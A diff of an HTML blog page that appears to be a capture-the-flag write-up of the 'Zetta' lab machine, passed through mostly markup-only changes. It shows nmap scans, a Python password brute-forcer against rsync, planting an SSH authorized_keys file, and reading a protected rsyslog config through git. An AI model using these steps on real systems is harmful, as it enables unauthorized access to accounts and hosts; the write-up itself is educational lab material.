-21:57:25.140243 IP6 <span class="o">(</span>flowlabel 0x924d3, hlim 63, next-header TCP <span class="o">(</span>6<span class="o">)</span> payload length: 40<span class="o">)</span> dead:beef::250:56ff:febd:a9a4.51208 &gt; dead:beef:2::11df.2222: Flags <span class="o">[</span>S<span class="o">]</span>, cksum 0x9b6f <span class="o">(</span>correct<span class="o">)</span>,
-seq 2652376284, win 28800, options <span class="o">[</span>mss 1337,sackOK,TS val <span class="m">1847133177</span> ecr 0,nop,wscale 7<span class="o">]</span>, length <span class="m">0</span>
-21:57:25.140287 IP6 <span class="o">(</span>flowlabel 0x55bf9, hlim 64, next-header TCP <span class="o">(</span>6<span class="o">)</span> payload length: 20<span class="o">)</span> dead:beef:2::11df.2222 &gt; _dead:beef::250:56ff:febd:a9a4_.51208: Flags <span class="o">[</span>R.<span class="o">]</span>, cksum 0xe556 <span class="o">(</span>correct<span class="o">)</span>,
-seq 0, ack 2652376285, win 0, length <span class="m">0</span>
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@gr4n173:~$ tcpdump -lni tun0 -vvvvvvvv ip6
+</span></span><span class="line"><span class="cl">tcpdump: listening on tun0, link-type RAW <span class="o">(</span>Raw IP<span class="o">)</span>, capture size <span class="m">262144</span> bytes
+</span></span><span class="line"><span class="cl">21:57:25.140243 IP6 <span class="o">(</span>flowlabel 0x924d3, hlim 63, next-header TCP <span class="o">(</span>6<span class="o">)</span> payload length: 40<span class="o">)</span> dead:beef::250:56ff:febd:a9a4.51208 &gt; dead:beef:2::11df.2222: Flags <span class="o">[</span>S<span class="o">]</span>, cksum 0x9b6f <span class="o">(</span>correct<span class="o">)</span>,
+</span></span><span class="line"><span class="cl">seq 2652376284, win 28800, options <span class="o">[</span>mss 1337,sackOK,TS val <span class="m">1847133177</span> ecr 0,nop,wscale 7<span class="o">]</span>, length <span class="m">0</span>
+</span></span><span class="line"><span class="cl">21:57:25.140287 IP6 <span class="o">(</span>flowlabel 0x55bf9, hlim 64, next-header TCP <span class="o">(</span>6<span class="o">)</span> payload length: 20<span class="o">)</span> dead:beef:2::11df.2222 &gt; _dead:beef::250:56ff:febd:a9a4_.51208: Flags <span class="o">[</span>R.<span class="o">]</span>, cksum 0xe556 <span class="o">(</span>correct<span class="o">)</span>,
+</span></span><span class="line"><span class="cl">seq 0, ack 2652376285, win 0, length <span class="m">0</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>I pinged to this IPV6 and I got pinged back which indicates it was working fine. Now I tried again with nmap for IPV6 and got this with rsync service at port 8730 as</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -455,58 +390,58 @@ seq 0, ack 2652376285, win 0, length <span class="m">0</span>
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~<span class="nv">$nmap</span> -sV -sC -6 dead:beef::250:56ff:febd:a9a4 -p 1-10000
-Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-02-16 22:23 +0545
-Nmap scan report <span class="k">for</span> dead:beef::250:56ff:febd:a9a4
-Host is up <span class="o">(</span>0.28s latency<span class="o">)</span>.
-Not shown: <span class="m">9996</span> closed ports
-PORT     STATE SERVICE VERSION
-21/tcp   open  ftp     Pure-FTPd
-22/tcp   open  ssh     OpenSSH 7.9p1 Debian <span class="m">10</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
-<span class="p">|</span> ssh-hostkey: 
-<span class="p">|</span>   <span class="m">2048</span> 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 <span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span>   <span class="m">256</span> 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 <span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="p">|</span>_  <span class="m">256</span> b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab <span class="o">(</span>ED25519<span class="o">)</span>
-80/tcp   open  http    nginx
-<span class="p">|</span>_http-title: Ze::a Share
-8730/tcp open  rsync   <span class="o">(</span>protocol version 31<span class="o">)</span>
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-
-Host script results:
-<span class="p">|</span> address-info: 
-<span class="p">|</span>   IPv6 EUI-64: 
-<span class="p">|</span>     MAC address: 
-<span class="p">|</span>       address: 00:50:56:bd:a9:a4
-<span class="p">|</span>_      manuf: VMware
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 320.92 seconds
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@gr4n173:~<span class="nv">$nmap</span> -sV -sC -6 dead:beef::250:56ff:febd:a9a4 -p 1-10000
+</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-02-16 22:23 +0545
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> dead:beef::250:56ff:febd:a9a4
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.28s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">9996</span> closed ports
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">21/tcp   open  ftp     Pure-FTPd
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 7.9p1 Debian <span class="m">10</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http    nginx
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Ze::a Share
+</span></span><span class="line"><span class="cl">8730/tcp open  rsync   <span class="o">(</span>protocol version 31<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> address-info: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   IPv6 EUI-64: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     MAC address: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>       address: 00:50:56:bd:a9:a4
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_      manuf: VMware
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 320.92 seconds
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="rsync--authorized_keys--usertxt">Rsync-&gt; authorized_keys-&gt; User.txt</h2>
 <p>I googled and read everything regarding the service rsync and made some script with nmap as</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ nmap -sV -6 --script rsync-brute --script-args <span class="nv">userdb</span><span class="o">=</span>/var/usernames.txt,passdb<span class="o">=</span>/var/passwords.txt -p <span class="m">873</span> dead:beef::250:56ff:febd:a9a4
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@gr4n173:~$ nmap -sV -6 --script rsync-brute --script-args <span class="nv">userdb</span><span class="o">=</span>/var/usernames.txt,passdb<span class="o">=</span>/var/passwords.txt -p <span class="m">873</span> dead:beef::250:56ff:febd:a9a4
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>but this didn&rsquo;t work though so I searched other way to get remote rsync to the server and finally this worked for me.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"> root@gr4n173:~<span class="nv">$rsync</span> -av rsync://<span class="o">[</span>dead:beef::250:56ff:febd:a9a4<span class="o">]</span>:8730/etc/rsyncd.conf  /tmp/rsyncd.conf 
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> root@gr4n173:~<span class="nv">$rsync</span> -av rsync://<span class="o">[</span>dead:beef::250:56ff:febd:a9a4<span class="o">]</span>:8730/etc/rsyncd.conf  /tmp/rsyncd.conf 
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="script-in-python">Script in Python</h3>
 <p>From here I got username <code>roy</code> now, I had to crack password of user roy. For that, I had wrote an script in python using pexpect to sending and receiving the files over socket. You can download script from <a href="exploit.py" rel="">here</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -522,38 +457,38 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/bin/python3</span>
-
-<span class="kn">import</span> <span class="nn">pexpect</span>
-<span class="n">p</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/usr/share/wordlists/rockyou.txt&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span>
-<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">p</span><span class="p">:</span>
-
-    <span class="n">login</span> <span class="o">=</span> <span class="n">pexpect</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s1">&#39;rsync -6 -rdt rsync://roy@[dead:beef::250:56ff:febd:a9a4]:8730/home_roy/.ssh ssh&#39;</span><span class="p">)</span>
-    <span class="n">login</span><span class="o">.</span><span class="n">expect</span><span class="p">(</span><span class="s1">&#39;Password:&#39;</span><span class="p">)</span>
-    <span class="n">login</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
-    <span class="k">if</span> <span class="s2">&#34;auth failed on module&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">login</span><span class="o">.</span><span class="n">read</span><span class="p">():</span>
-       <span class="k">break</span>
-    <span class="k">else</span><span class="p">:</span>
-       <span class="k">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
-       
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/bin/python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pexpect</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/usr/share/wordlists/rockyou.txt&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">p</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">login</span> <span class="o">=</span> <span class="n">pexpect</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s1">&#39;rsync -6 -rdt rsync://roy@[dead:beef::250:56ff:febd:a9a4]:8730/home_roy/.ssh ssh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">login</span><span class="o">.</span><span class="n">expect</span><span class="p">(</span><span class="s1">&#39;Password:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">login</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;auth failed on module&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">login</span><span class="o">.</span><span class="n">read</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">       <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">       <span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">       
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>from here I got the password of user roy as :- computer
 Now I tried to download the id_rsa key of roy user but that fails since roy didn&rsquo;t have id_rsa key instead used my own authorized_keys to get the shell of user roy.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"> root@gr4n173:~<span class="nv">$rsync</span> -rdt authorized_keys -6 -rdt rsync://roy@<span class="o">[</span>dead:beef::250:56ff:febd:7d3b<span class="o">]</span>:8730/home_roy/.ssh
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> root@gr4n173:~<span class="nv">$rsync</span> -rdt authorized_keys -6 -rdt rsync://roy@<span class="o">[</span>dead:beef::250:56ff:febd:7d3b<span class="o">]</span>:8730/home_roy/.ssh
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Here now authorized_keys let me to  shell of user roy and also I had used the user roy along with it&rsquo;s password <code>computer</code>.</p>
 <h2 id="shell-as-roy">Shell as roy</h2>
 <p>Finally I got the shell of roy and got the <code>user.txt</code> as</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -564,22 +499,22 @@ Now I tried to download the id_rsa key of roy user but that fails since roy didn
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ ssh roy@zetta.htb
-Linux zetta 4.19.0-5-amd64 <span class="c1">#1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64</span>
-Last login: Sat Feb <span class="m">15</span> 22:05:58 <span class="m">2020</span> from 10.10.14.193
-roy@zetta:~$ whoami
-roy
-roy@zetta:~$ ls
-user.txt
-roy@zetta:~$ cat user.txt
-a575bdb*************************
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@gr4n173:~$ ssh roy@zetta.htb
+</span></span><span class="line"><span class="cl">Linux zetta 4.19.0-5-amd64 <span class="c1">#1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64</span>
+</span></span><span class="line"><span class="cl">Last login: Sat Feb <span class="m">15</span> 22:05:58 <span class="m">2020</span> from 10.10.14.193
+</span></span><span class="line"><span class="cl">roy@zetta:~$ whoami
+</span></span><span class="line"><span class="cl">roy
+</span></span><span class="line"><span class="cl">roy@zetta:~$ ls
+</span></span><span class="line"><span class="cl">user.txt
+</span></span><span class="line"><span class="cl">roy@zetta:~$ cat user.txt
+</span></span><span class="line"><span class="cl">a575bdb*************************
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="postgresql-exploit">Postgresql Exploit</h3>
 <p>After I got user.txt i.e. roy shell ,I found .tudu.xml file in home directory of roy where many to do list was written.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -605,42 +540,40 @@ a575bdb*************************
 </span><span class="lnt">24
 </span><span class="lnt">25
 </span><span class="lnt">26
-</span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-html" data-lang="html">.......
-
-					<span class="p">&lt;</span><span class="nt">todo</span> <span class="na">done</span><span class="o">=</span><span class="s">&#34;no&#34;</span> <span class="na">collapse</span><span class="o">=</span><span class="s">&#34;no&#34;</span><span class="p">&gt;</span>                                                                                            
-                                <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Check postgresql log for errors after configuration<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>                                                    
-                                <span class="p">&lt;</span><span class="nt">text</span><span class="p">&gt;</span>                                                                                                                
-<span class="p">&lt;/</span><span class="nt">text</span><span class="p">&gt;</span>                                                                                                                                               
-                        <span class="p">&lt;/</span><span class="nt">todo</span><span class="p">&gt;</span>                                                                                                                       
-                        <span class="p">&lt;</span><span class="nt">todo</span> <span class="na">done</span><span class="o">=</span><span class="s">&#34;yes&#34;</span> <span class="na">collapse</span><span class="o">=</span><span class="s">&#34;no&#34;</span><span class="p">&gt;</span>
-                                <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Prototype/test DB push of syslog events<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
-                                <span class="p">&lt;</span><span class="nt">text</span><span class="p">&gt;</span> 
-<span class="p">&lt;/</span><span class="nt">text</span><span class="p">&gt;</span>
-                        <span class="p">&lt;/</span><span class="nt">todo</span><span class="p">&gt;</span>
-                        <span class="p">&lt;</span><span class="nt">todo</span> <span class="na">done</span><span class="o">=</span><span class="s">&#34;no&#34;</span> <span class="na">collapse</span><span class="o">=</span><span class="s">&#34;no&#34;</span><span class="p">&gt;</span>
-                                <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Testing<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
-                                <span class="p">&lt;</span><span class="nt">text</span><span class="p">&gt;</span> 
-<span class="p">&lt;/</span><span class="nt">text</span><span class="p">&gt;</span>
-                        <span class="p">&lt;/</span><span class="nt">todo</span><span class="p">&gt;</span>
-                        <span class="p">&lt;</span><span class="nt">todo</span> <span class="na">done</span><span class="o">=</span><span class="s">&#34;no&#34;</span> <span class="na">collapse</span><span class="o">=</span><span class="s">&#34;no&#34;</span><span class="p">&gt;</span>
-                                <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Rework syslog configuration to push all events to the DB<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
-                                <span class="p">&lt;</span><span class="nt">text</span><span class="p">&gt;</span> 
-<span class="p">&lt;/</span><span class="nt">text</span><span class="p">&gt;</span>
-                        <span class="p">&lt;/</span><span class="nt">todo</span><span class="p">&gt;</span>
-                        <span class="p">&lt;</span><span class="nt">todo</span> <span class="na">done</span><span class="o">=</span><span class="s">&#34;no&#34;</span> <span class="na">collapse</span><span class="o">=</span><span class="s">&#34;no&#34;</span><span class="p">&gt;</span>
-                                <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Find/write GUI for syslog-db access/view<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
-                                <span class="p">&lt;</span><span class="nt">text</span><span class="p">&gt;</span> 
-........
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">.......
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">					<span class="p">&lt;</span><span class="nt">todo</span> <span class="na">done</span><span class="o">=</span><span class="s">&#34;no&#34;</span> <span class="na">collapse</span><span class="o">=</span><span class="s">&#34;no&#34;</span><span class="p">&gt;</span>                                                                                            
+</span></span><span class="line"><span class="cl">                                <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Check postgresql log for errors after configuration<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>                                                    
+</span></span><span class="line"><span class="cl">                                <span class="p">&lt;</span><span class="nt">text</span><span class="p">&gt;</span>                                                                                                                
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">text</span><span class="p">&gt;</span>                                                                                                                                               
+</span></span><span class="line"><span class="cl">                        <span class="p">&lt;/</span><span class="nt">todo</span><span class="p">&gt;</span>                                                                                                                       
+</span></span><span class="line"><span class="cl">                        <span class="p">&lt;</span><span class="nt">todo</span> <span class="na">done</span><span class="o">=</span><span class="s">&#34;yes&#34;</span> <span class="na">collapse</span><span class="o">=</span><span class="s">&#34;no&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">                                <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Prototype/test DB push of syslog events<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">                                <span class="p">&lt;</span><span class="nt">text</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">text</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">&lt;/</span><span class="nt">todo</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">&lt;</span><span class="nt">todo</span> <span class="na">done</span><span class="o">=</span><span class="s">&#34;no&#34;</span> <span class="na">collapse</span><span class="o">=</span><span class="s">&#34;no&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">                                <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Testing<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">                                <span class="p">&lt;</span><span class="nt">text</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">text</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">&lt;/</span><span class="nt">todo</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">&lt;</span><span class="nt">todo</span> <span class="na">done</span><span class="o">=</span><span class="s">&#34;no&#34;</span> <span class="na">collapse</span><span class="o">=</span><span class="s">&#34;no&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">                                <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Rework syslog configuration to push all events to the DB<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">                                <span class="p">&lt;</span><span class="nt">text</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">text</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">&lt;/</span><span class="nt">todo</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">&lt;</span><span class="nt">todo</span> <span class="na">done</span><span class="o">=</span><span class="s">&#34;no&#34;</span> <span class="na">collapse</span><span class="o">=</span><span class="s">&#34;no&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">                                <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Find/write GUI for syslog-db access/view<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">                                <span class="p">&lt;</span><span class="nt">text</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl">........
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>From above todo list I had to check postgresql log for errors, Hence it confirmed me to exploit log. After a lot of enumeration I found something fishy in <code>/etc/rsyslog.d/.git</code> where I found <em>pgsql.conf</em> but I wasn&rsquo;t able to cat that file due to permission error. So I used other ways to read that file. For that I used git command since, there is .git repo in that directory as</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -652,22 +585,22 @@ a575bdb*************************
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">roy@zetta:/tmp$ <span class="nb">cd</span> /etc/rsyslog.d/
-roy@zetta:/etc/rsyslog.d$ git clone /etc/rsyslog.d/.git /tmp/.git
-Cloning into <span class="s1">&#39;/tmp/.git&#39;</span>...
-<span class="k">done</span>.
-roy@zetta:/etc/rsyslog.d$ ls -al /tmp/.git/
-total <span class="m">16</span>
-drwxr-xr-x  <span class="m">3</span> roy  roy  <span class="m">4096</span> Feb <span class="m">20</span> 06:21 .
-drwxrwxrwt <span class="m">11</span> root root <span class="m">4096</span> Feb <span class="m">20</span> 06:21 ..
-drwxr-xr-x  <span class="m">8</span> roy  roy  <span class="m">4096</span> Feb <span class="m">20</span> 06:21 .git
--rw-r--r--  <span class="m">1</span> roy  roy   <span class="m">807</span> Feb <span class="m">20</span> 06:21 pgsql.conf
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">roy@zetta:/tmp$ <span class="nb">cd</span> /etc/rsyslog.d/
+</span></span><span class="line"><span class="cl">roy@zetta:/etc/rsyslog.d$ git clone /etc/rsyslog.d/.git /tmp/.git
+</span></span><span class="line"><span class="cl">Cloning into <span class="s1">&#39;/tmp/.git&#39;</span>...
+</span></span><span class="line"><span class="cl"><span class="k">done</span>.
+</span></span><span class="line"><span class="cl">roy@zetta:/etc/rsyslog.d$ ls -al /tmp/.git/
+</span></span><span class="line"><span class="cl">total <span class="m">16</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> roy  roy  <span class="m">4096</span> Feb <span class="m">20</span> 06:21 .
+</span></span><span class="line"><span class="cl">drwxrwxrwt <span class="m">11</span> root root <span class="m">4096</span> Feb <span class="m">20</span> 06:21 ..
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">8</span> roy  roy  <span class="m">4096</span> Feb <span class="m">20</span> 06:21 .git
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> roy  roy   <span class="m">807</span> Feb <span class="m">20</span> 06:21 pgsql.conf
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p>Now I was able to cat that file and where the file indicates there is sql injection one of the template and gives more information about local logging. Logging was new for me so googled and collected information about it. If you have known about logging then you can escape this blog but if you are unknown about logging in syslog then you can click <a href="http://nginx.org/en/docs/syslog.html" target="_blank" rel="noopener noreffer">here</a>.</p>
+</div><p>Now I was able to cat that file and where the file indicates there is sql injection one of the template and gives more information about local logging. Logging was new for me so googled and collected information about it. If you have known about logging then you can escape this blog but if you are unknown about logging in syslog then you can click <a href="http://nginx.org/en/docs/syslog.html" target="_blank" rel="noopener noreffer ">here</a>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -688,44 +621,44 @@ drwxr-xr-x  <span class="m">8</span> roy  roy  <span class="m">4096</span> Feb <
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">roy@zetta:/tmp/.git$ cat pgsql.conf
-<span class="c1">### Configuration file for rsyslog-pgsql</span>
-<span class="c1">### Changes are preserved</span>
-<span class="c1"># https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html</span>
-<span class="c1"># Used default template from documentation/source but adapted table</span>
-<span class="c1"># name to syslog_lines so the Ruby on Rails application Maurice is</span>
-<span class="c1"># coding can use this as SyslogLine object.</span>
-<span class="c1"># template(name=&#34;sql-syslog&#34; type=&#34;list&#34; option.sql=&#34;on&#34;) {</span>
-  constant<span class="o">(</span><span class="nv">value</span><span class="o">=</span><span class="s2">&#34;INSERT INTO syslog_lines (message, devicereportedtime) values (&#39;&#34;</span><span class="o">)</span>
-  property<span class="o">(</span><span class="nv">name</span><span class="o">=</span><span class="s2">&#34;msg&#34;</span><span class="o">)</span>
-  constant<span class="o">(</span><span class="nv">value</span><span class="o">=</span><span class="s2">&#34;&#39;,&#39;&#34;</span><span class="o">)</span>
